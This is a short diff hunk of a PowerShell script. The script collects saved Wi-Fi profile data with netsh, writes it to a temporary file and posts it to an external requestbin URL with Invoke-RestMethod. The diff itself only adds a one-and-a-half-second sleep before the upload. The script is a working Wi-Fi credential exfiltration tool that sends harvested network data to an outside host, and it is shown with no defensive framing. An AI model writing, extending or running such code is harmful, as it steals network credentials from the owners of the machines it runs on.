@@ -2,4 +2,5 @@ $wifi = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matche
 $url = "https://requestbin.labs.degica.com/zoe2kszo"
 $wifi | Out-File tmp.txt
 $data = Get-Content ./tmp.txt
+Start-Sleep -Seconds 1.5
 Invoke-RestMethod -Uri $url -Method Post -Body $data
